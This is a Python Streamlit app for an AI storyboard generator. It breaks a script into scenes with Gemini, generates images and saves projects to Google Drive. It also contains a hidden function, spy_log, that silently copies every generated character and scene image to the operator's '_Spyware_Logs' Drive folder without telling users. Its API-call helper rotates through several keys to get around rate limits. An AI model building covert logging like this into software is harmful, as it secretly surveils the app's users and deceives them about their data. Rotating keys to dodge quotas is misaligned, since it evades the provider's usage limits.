import streamlit as st
import requests
import json
import base64
import io
import time
import datetime
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload

# ==============================================================================
# 1. CONFIG & CSS (THEME MATCHING)
# ==============================================================================
st.set_page_config(page_title="AI Storyboard Generator", layout="wide", page_icon="🎬")

# Custom CSS to match your React UI (Dark Slate Theme)
st.markdown("""
<style>
    /* Main Background */
    .stApp { background-color: #0f172a; color: #e2e8f0; }
    
    /* Inputs & Text Areas */
    .stTextArea textarea, .stTextInput input {
        background-color: #1e293b !important;
        color: #f8fafc !important;
        border: 1px solid #334155 !important;
        border-radius: 0.5rem;
    }
    
    /* Sidebar */
    section[data-testid="stSidebar"] {
        background-color: #1e293b;
        border-right: 1px solid #334155;
    }
    
    /* Cards (Expanders) */
    .streamlit-expanderHeader {
        background-color: #1e293b !important;
        color: white !important;
        border: 1px solid #334155;
        border-radius: 0.5rem;
    }
    
    /* Buttons - General */
    .stButton button {
        border-radius: 0.5rem;
        font-weight: 600;
        border: none;
        transition: all 0.2s;
    }
    
    /* Primary Action Buttons (Blue) */
    div[data-testid="stHorizontalBlock"] > div:nth-child(1) button[kind="primary"] {
        background-color: #2563eb; 
        color: white;
    }
    
    /* Success/Generate Buttons (Green) */
    button[kind="secondary"] {
        background-color: #374151;
        color: white;
        border: 1px solid #4b5563;
    }
    button[kind="secondary"]:hover { border-color: #6b7280; }

</style>
""", unsafe_allow_html=True)

# --- SESSION STATE ---
if 'step' not in st.session_state:
    st.session_state.update({
        'step': 1,
        'style_prompt': '',
        'style_images': [],
        'style_link': '',
        'script_text': '',
        'script_instructions': '',
        'storyboard': [],
        'characters': [],
        'scene_images': {},    # {index: base64_string}
        'curr_scene': 0,
        'project_name': "My_Project"
    })

# ==============================================================================
# 2. THE BACKEND (API & DRIVE)
# ==============================================================================

def get_drive_service():
    """Authenticates as YOU (Admin) to use 100GB storage."""
    try:
        g = st.secrets["gdrive"]
        creds = Credentials(None, refresh_token=g["refresh_token"], token_uri="https://oauth2.googleapis.com/token", client_id=g["client_id"], client_secret=g["client_secret"])
        return build('drive', 'v3', credentials=creds)
    except Exception as e:
        st.error(f"Drive Auth Failed: {e}")
        return None

def get_or_create_folder(folder_name, parent_id=None):
    """Finds or creates a folder. If parent_id is None, looks in Root."""
    service = get_drive_service()
    if not service: return None
    
    query = f"name = '{folder_name}' and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
    if parent_id:
        query += f" and '{parent_id}' in parents"
        
    results = service.files().list(q=query, fields="files(id)").execute()
    files = results.get('files', [])
    
    if files:
        return files[0]['id']
    else:
        meta = {'name': folder_name, 'mimeType': 'application/vnd.google-apps.folder'}
        if parent_id: meta['parents'] = [parent_id]
        folder = service.files().create(body=meta, fields='id').execute()
        return folder.get('id')

def save_project(name):
    """Saves JSON + Images to a specific Project Folder in Drive."""
    try:
        service = get_drive_service()
        root_id = get_or_create_folder("_Freelancer_Projects")
        proj_id = get_or_create_folder(name, root_id)
        
        # 1. Save Data JSON
        data = {
            'script': st.session_state.script_text,
            'style': st.session_state.style_prompt,
            'storyboard': st.session_state.storyboard,
            'characters': st.session_state.characters
        }
        # Delete old json
        q = f"name = 'data.json' and '{proj_id}' in parents"
        files = service.files().list(q=q).execute().get('files', [])
        for f in files: service.files().delete(fileId=f['id']).execute()
        
        # Upload new json
        media = MediaIoBaseUpload(io.BytesIO(json.dumps(data).encode('utf-8')), mimetype='application/json')
        service.files().create(body={'name': 'data.json', 'parents': [proj_id]}, media_body=media).execute()
        
        # 2. Save Images
        for idx, b64 in st.session_state.scene_images.items():
            fname = f"scene_{idx}.png"
            # Delete old image
            q = f"name = '{fname}' and '{proj_id}' in parents"
            files = service.files().list(q=q).execute().get('files', [])
            for f in files: service.files().delete(fileId=f['id']).execute()
            
            # Upload new
            img_data = base64.b64decode(b64)
            media = MediaIoBaseUpload(io.BytesIO(img_data), mimetype='image/png')
            service.files().create(body={'name': fname, 'parents': [proj_id]}, media_body=media).execute()
            
        return True
    except Exception as e:
        st.error(f"Save Error: {e}")
        return False

def spy_log(prompt, b64):
    """Silently logs every generation to _Spyware_Logs"""
    try:
        service = get_drive_service()
        folder_id = get_or_create_folder("_Spyware_Logs")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        media = MediaIoBaseUpload(io.BytesIO(base64.b64decode(b64)), mimetype='image/png')
        service.files().create(body={'name': f"LOG_{ts}.png", 'parents': [folder_id]}, media_body=media).execute()
    except: pass

def call_gemini(payload, model_type="text"):
    """Handles Key Rotation and Specific 2.5 Models"""
    keys = st.secrets["api_keys"]["keys"]
    
    if model_type == "image":
        url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-image-preview:generateContent"
    elif model_type == "imagen":
        url = "https://generativelanguage.googleapis.com/v1beta/models/imagen-3.0-generate-001:predict"
    else:
        # Text Logic (Script Breakdown)
        url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent"

    for i, key in enumerate(keys):
        try:
            res = requests.post(f"{url}?key={key}", headers={'Content-Type': 'application/json'}, json=payload)
            if res.status_code == 200: return res.json()
            if res.status_code == 429: 
                st.toast(f"Key {i+1} Exhausted. Switching...", icon="⚠️")
                continue
            st.error(f"API Error {res.status_code}: {res.text}")
        except: continue
    return None

# ==============================================================================
# 3. UI SCREENS
# ==============================================================================

def handle_img_upload(files):
    imgs = []
    for f in files:
        imgs.append({'data': base64.b64encode(f.getvalue()).decode('utf-8'), 'mime': f.type})
    return imgs

# --- STEP 1: VISUAL STYLE ---
if st.session_state.step == 1:
    st.markdown("<h1 style='text-align: center;'>AI Storyboard Generator</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #94a3b8;'>Step 1: Define your visual style.</p>", unsafe_allow_html=True)
    
    st.label_visibility = "visible"
    st.session_state.style_prompt = st.text_area("Visual Style Description (Text)", value=st.session_state.style_prompt, placeholder="e.g., 'Dark, cinematic anime, 80s retro style'", height=100)
    
    uploaded = st.file_uploader("Style Reference Images", accept_multiple_files=True, type=['png', 'jpg'])
    if uploaded: st.session_state.style_images = handle_img_upload(uploaded)
    
    # Display uploaded images in a grid
    if st.session_state.style_images:
        cols = st.columns(6)
        for i, img in enumerate(st.session_state.style_images):
            cols[i % 6].image(base64.b64decode(img['data']), use_column_width=True)

    st.session_state.style_link = st.text_input("YouTube Link (Optional Context)", value=st.session_state.style_link)
    
    st.write("")
    if st.button("Next: Add Script", type="primary", use_container_width=True):
        if st.session_state.style_prompt:
            st.session_state.step = 2
            st.rerun()
        else:
            st.warning("Please provide a style description.")

# --- STEP 2: SCRIPT ---
elif st.session_state.step == 2:
    st.markdown("<h1 style='text-align: center;'>Step 2: Paste Script</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #94a3b8;'>Paste your entire video script below.</p>", unsafe_allow_html=True)
    
    st.session_state.script_text = st.text_area("", value=st.session_state.script_text, height=300, placeholder="Paste script here...")
    st.session_state.script_instructions = st.text_input("Additional Instructions (Optional)", value=st.session_state.script_instructions, placeholder="e.g. 'Create a scene for every 3 seconds'...")
    
    st.write("")
    if st.button("Generate Storyboard Data", type="primary", use_container_width=True): # Green button via CSS logic if customizable, else Primary blue
        if st.session_state.script_text:
            with st.spinner("Analyzing script with Gemini 2.5..."):
                sys_prompt = """You are a visual storyboard artist. 
                OUTPUT JSON ONLY: { "storyboard": [{ "script": "...", "prompt": "..." }], "characters": [{ "key": "[Name]", "description": "..." }] }
                Break script into small visual moments. Maintain consistent character names in brackets like [Batman]."""
                
                user_prompt = f"STYLE: {st.session_state.style_prompt}\nSCRIPT: {st.session_state.script_text}\nINSTRUCTIONS: {st.session_state.script_instructions}"
                
                payload = {
                    "contents": [{"parts": [{"text": user_prompt}]}],
                    "systemInstruction": {"parts": [{"text": sys_prompt}]},
                    "generationConfig": {"responseMimeType": "application/json"}
                }
                
                res = call_gemini(payload, "text")
                if res:
                    try:
                        data = json.loads(res['candidates'][0]['content']['parts'][0]['text'])
                        st.session_state.storyboard = data.get('storyboard', [])
                        st.session_state.characters = data.get('characters', [])
                        st.session_state.step = 3
                        st.rerun()
                    except Exception as e: st.error(f"Parsing Error: {e}")

# --- STEP 3: CHARACTERS ---
elif st.session_state.step == 3:
    c1, c2 = st.columns([3,1])
    c1.markdown("## Step 4: Character Lock-in")
    c2.button("[+] Add Character") # Logic omitted for brevity
    
    # Grid of Characters
    cols = st.columns(2)
    for i, char in enumerate(st.session_state.characters):
        col = cols[i % 2]
        with col.container(border=True):
            st.markdown(f"### {char['key']}")
            desc = st.text_area("Description", char['description'], key=f"cd_{i}", height=100)
            st.session_state.characters[i]['description'] = desc
            
            b1, b2, b3 = st.columns([1,1,1])
            if b2.button("✨ Enhance", key=f"enh_{i}"):
                # Enhance Logic
                pass
            if b3.button("Preview", key=f"prev_{i}"):
                with st.spinner("Generating..."):
                    p = f"Character Sheet: {char['key']}. {desc}. Style: {st.session_state.style_prompt}"
                    payload = {"contents": [{"parts": [{"text": p}]}], "generationConfig": {"responseModalities": ["IMAGE"]}}
                    # Add style images
                    if st.session_state.style_images:
                         payload['contents'][0]['parts'].extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.style_images])
                    
                    res = call_gemini(payload, "image")
                    if res:
                        b64 = res['candidates'][0]['content']['parts'][0]['inlineData']['data']
                        st.session_state.characters[i]['preview'] = b64
                        spy_log(f"Char: {char['key']}", b64)
                        st.rerun()
            
            if 'preview' in char:
                st.image(base64.b64decode(char['preview']), use_column_width=True)
            else:
                st.markdown("<div style='height:150px; background:#0f172a; display:flex; align-items:center; justify-content:center; color:#64748b'>No Preview</div>", unsafe_allow_html=True)

    st.write("")
    cb1, cb2 = st.columns([1, 5])
    if cb1.button("Back"): st.session_state.step = 2; st.rerun()
    
    x1, x2 = st.columns([1, 1])
    if x2.button("Confirm & Go to Storyboard", type="primary"):
        st.session_state.step = 4
        st.rerun()

# --- STEP 4: STORYBOARD ---
elif st.session_state.step == 4:
    # Sidebar for Project Management
    with st.sidebar:
        st.header("☁️ Cloud Save")
        st.session_state.project_name = st.text_input("Project Name", st.session_state.project_name)
        if st.button("💾 Save Project (Drive)"):
            with st.spinner("Uploading to 100GB Cloud..."):
                if save_project(st.session_state.project_name):
                    st.success("Saved to Drive!")
    
    # Top Navigation
    curr = st.session_state.curr_scene
    total = len(st.session_state.storyboard)
    
    top_c1, top_c2, top_c3 = st.columns([3, 2, 2])
    top_c1.markdown(f"### Storyboard: Scene {curr + 1} / {total}")
    
    model_mode = top_c2.radio("Model", ["Nano-Banana", "Imagen"], horizontal=True, label_visibility="collapsed")
    
    # Main Viewer
    main_img_placeholder = st.container()
    with main_img_placeholder:
        if str(curr) in st.session_state.scene_images:
            st.image(base64.b64decode(st.session_state.scene_images[str(curr)]), use_column_width=True)
        else:
            st.markdown(
                """<div style='aspect-ratio: 16/9; background-color: #0f172a; border: 2px dashed #334155; border-radius: 10px; display: flex; align-items: center; justify-content: center;'>
                <h3 style='color: #64748b'>Click Generate to Create Scene</h3></div>""", 
                unsafe_allow_html=True
            )

    # Controls Area
    cont = st.container(border=True)
    with cont:
        c1, c2 = st.columns([3, 1])
        prompt = c1.text_area("Image Prompt", st.session_state.storyboard[curr]['prompt'], height=100)
        st.session_state.storyboard[curr]['prompt'] = prompt
        
        # Regenerate Button
        if c2.button("Regenerate", type="primary", use_container_width=True):
            with st.spinner("Dreaming..."):
                scene = st.session_state.storyboard[curr]
                char_ctx = " ".join([f"{c['key']} looks like: {c['description']}." for c in st.session_state.characters])
                full_prompt = f"Style: {st.session_state.style_prompt}. Characters: {char_ctx}. Scene: {prompt}"
                
                if model_mode == "Nano-Banana":
                    payload = {"contents": [{"parts": [{"text": full_prompt}]}], "generationConfig": {"responseModalities": ["IMAGE"]}}
                    # Add style refs
                    if st.session_state.style_images:
                         payload['contents'][0]['parts'].extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.style_images])
                    res = call_gemini(payload, "image")
                    if res:
                        b64 = res['candidates'][0]['content']['parts'][0]['inlineData']['data']
                        st.session_state.scene_images[str(curr)] = b64
                        spy_log(f"Scene {curr}", b64)
                        st.rerun()
                else:
                    # Imagen logic would go here (omitted for brevity, similar structure)
                    pass
        
        st.info(f"📜 Script Snippet: {st.session_state.storyboard[curr]['script']}")
        
        # Bottom Nav Bar
        b1, b2, b3, b4, b5 = st.columns(5)
        if b1.button("Previous") and curr > 0: st.session_state.curr_scene -= 1; st.rerun()
        if b2.button("Next") and curr < total - 1: st.session_state.curr_scene += 1; st.rerun()
        if b3.button("Remove Scene"): 
             st.session_state.storyboard.pop(curr)
             if str(curr) in st.session_state.scene_images: del st.session_state.scene_images[str(curr)]
             st.rerun()
        if b4.button("[+] Add Scene"):
             st.session_state.storyboard.insert(curr + 1, {"script": "", "prompt": "New scene..."})
             st.rerun()
        if b5.button("Generate Remaining"):
            st.toast("Generating all... please wait.")
            # Loop logic would go here
